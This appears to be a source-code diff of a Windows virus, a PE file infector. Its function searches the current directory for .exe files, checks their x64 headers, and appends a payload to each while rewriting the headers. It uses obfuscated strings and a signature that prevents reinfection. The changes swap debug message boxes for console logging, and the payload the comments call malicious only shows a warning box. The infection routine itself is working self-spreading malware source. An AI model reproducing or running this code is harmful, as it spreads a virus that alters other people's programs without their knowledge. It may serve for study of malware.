@@ -4,6 +4,8 @@
 #include "libproc.hpp"
 #include "utils.h"
 
+#define __PRINTF_BUFSIZE 1024
+
 EXTERN_C_START
 extern CONST BYTE __payload_start;
 extern CONST VOID payload();
@@ -33,15 +35,19 @@ INJECTED_CODE VOID inj_code_c() {
     DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
 #ifdef PL_DEBUG
     // Declarations for debug strings
-    INJECTED_VAR static CONST CHAR mbModuleName[] = "Current module name";
-    INJECTED_VAR static CONST CHAR mbInjecting[] = "Injecting...";
-    INJECTED_VAR static CONST CHAR mbSkipping[] = "Skipping file";
+    CONST CHAR sNewline[] = "\n";
+
+    INJECTED_VAR static CONST CHAR msgSeparator[] = "====================";
+    INJECTED_VAR static CONST CHAR msgModuleName[] = "Current module name: ";
+    INJECTED_VAR static CONST CHAR msgInjecting[] = "Injecting: ";
+    INJECTED_VAR static CONST CHAR msgSkipping[] = "Skipping file: ";
     INJECTED_VAR static CONST CHAR errGetModName[] = "Error getting module name";
     INJECTED_VAR static CONST CHAR errGetDir[] = "Error getting current directory";
     INJECTED_VAR static CONST CHAR errFindFile[] = "No .exe files";
     INJECTED_VAR static CONST CHAR errOpenFile[] = "Error opening file";
     INJECTED_VAR static CONST CHAR errMapFile[] = "Error mapping file";
     INJECTED_VAR static CONST CHAR errNotPE[] = "Not a PE x64 file";
+    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "Payload already injected";
 #endif  // PL_DEBUG
 
     // Get module handles and function pointers
@@ -63,6 +69,20 @@ INJECTED_CODE VOID inj_code_c() {
 
     CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
+
+#ifdef PL_DEBUG
+    CONST auto pGetStdHandle = GET_FUNC(pKernel32Dll, GetStdHandle);
+    CONST auto pWriteConsoleA = GET_FUNC(pKernel32Dll, WriteConsoleA);
+    HANDLE hStderr = pGetStdHandle(STD_ERROR_HANDLE);
+    if (!hStderr || hStderr == INVALID_HANDLE_VALUE) {
+        return;
+    }
+#define PRINT_DBG(text) pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL)
+#define PRINT_DBG_NL()  pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL)
+#else                   // PL_DEBUG
+#define PRINT_DBG(text) /* [Debug disabled] */
+#define PRINT_DBG_NL()  /* [Debug disabled] */
+#endif                  // PL_DEBUG
     /* */
 
     LPSTR sDirEnd;  // Pointer to the end of the directory path in `sFilePath`, after the final '\\'
@@ -71,16 +91,18 @@ INJECTED_CODE VOID inj_code_c() {
     CHAR sModuleName[MAX_PATH];  // Buffer for the module name
     DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
     if (res == 0 || res >= sizeof(sModuleName)) {
-        MSGBOX_DBG(errGetModName, NULL, MB_OK | MB_ICONERROR);
+        PRINT_DBG(errGetModName);
         goto end;
     }
-    MSGBOX_DBG(sModuleName, mbModuleName, MB_OK | MB_ICONINFORMATION);
+    PRINT_DBG(msgModuleName);
+    PRINT_DBG(sModuleName);
+    PRINT_DBG_NL();
 
     CHAR sDirName[MAX_PATH];   // Buffer for the directory name
     CHAR sFindPath[MAX_PATH];  // Buffer for the search path
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
     if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
-        MSGBOX_DBG(errGetDir, NULL, MB_OK | MB_ICONERROR);
+        PRINT_DBG(errGetDir);
         goto end;
     }
     // Append a backslash to the current directory name
@@ -95,7 +117,7 @@ INJECTED_CODE VOID inj_code_c() {
     WIN32_FIND_DATAA findData;  // Structure to hold file search results
     hFind = pFindFirstFileA(sFindPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
-        MSGBOX_DBG(errFindFile, NULL, MB_OK | MB_ICONERROR);
+        PRINT_DBG(errFindFile);
         goto end;
     }
 
@@ -125,15 +147,20 @@ INJECTED_CODE VOID inj_code_c() {
             || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
 #endif                            // NEED_BANG
         ) {
-            MSGBOX_DBG(sFilePath, mbSkipping, MB_OK | MB_ICONWARNING);
+            PRINT_DBG(msgSkipping);
+            PRINT_DBG(sFilePath);
+            PRINT_DBG_NL();
             continue;
         }
-        MSGBOX_DBG(sFilePath, mbInjecting, MB_OK | MB_ICONINFORMATION);
+        PRINT_DBG(msgInjecting);
+        PRINT_DBG(sFilePath);
+        PRINT_DBG_NL();
 
         hFile = pCreateFileA(sFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
-            MSGBOX_DBG(errOpenFile, NULL, MB_OK | MB_ICONERROR);
+            PRINT_DBG(errOpenFile);
+            PRINT_DBG_NL();
             continue;
         }
 
@@ -144,26 +171,28 @@ INJECTED_CODE VOID inj_code_c() {
 
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, dwFileSize, NULL);
         if (hMapFile == NULL) {
-            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
+            PRINT_DBG(errMapFile);
+            PRINT_DBG_NL();
             goto close_file;
         }
 
         pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
         if (pMapAddress == NULL) {
-            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
+            PRINT_DBG(errMapFile);
+            PRINT_DBG_NL();
             goto close_map;
         }
 
         pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
         if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-            goto error;
+            goto invalid_pe;
         }
 
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
         if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
             pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
             pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-            goto error;
+            goto invalid_pe;
         }
 
         dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
@@ -184,7 +213,9 @@ INJECTED_CODE VOID inj_code_c() {
                                      (dwOrigEntryPoint - dwLastSectionRva) -
                                      ((PCBYTE)&payload - (PCBYTE)&signature));
             if (dwSignature == signature) {
-                goto error;
+                PRINT_DBG(errAlreadyInjected);
+                PRINT_DBG_NL();
+                goto unmap;
             }
         }
 #endif  // SKIP_SIGN
@@ -205,26 +236,28 @@ INJECTED_CODE VOID inj_code_c() {
         // Remap the file in read-write mode to inject the payload and update the headers
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
         if (hMapFile == NULL) {
-            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
+            PRINT_DBG(errMapFile);
+            PRINT_DBG_NL();
             goto close_file;
         }
 
         pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
         if (pMapAddress == NULL) {
-            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
+            PRINT_DBG(errMapFile);
+            PRINT_DBG_NL();
             goto close_map;
         }
 
         pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
         if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-            goto error;
+            goto invalid_pe;
         }
 
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
         if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
             pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
             pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-            goto error;
+            goto invalid_pe;
         }
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
@@ -255,8 +288,10 @@ INJECTED_CODE VOID inj_code_c() {
 
         pFlushViewOfFile(pMapAddress, 0);
         goto unmap;
-    error:
-        MSGBOX_DBG(sFilePath, NULL, MB_OK | MB_ICONERROR);
+
+    invalid_pe:
+        PRINT_DBG(errNotPE);
+        PRINT_DBG_NL();
     unmap:
         pUnmapViewOfFile(pMapAddress);
     close_map:
@@ -268,6 +303,10 @@ INJECTED_CODE VOID inj_code_c() {
     pFindClose(hFind);
 
 end:
+    PRINT_DBG_NL();
+    PRINT_DBG(msgSeparator);
+    PRINT_DBG_NL();
+
     // Actual malicious payload: display a message box
     pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
                  MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
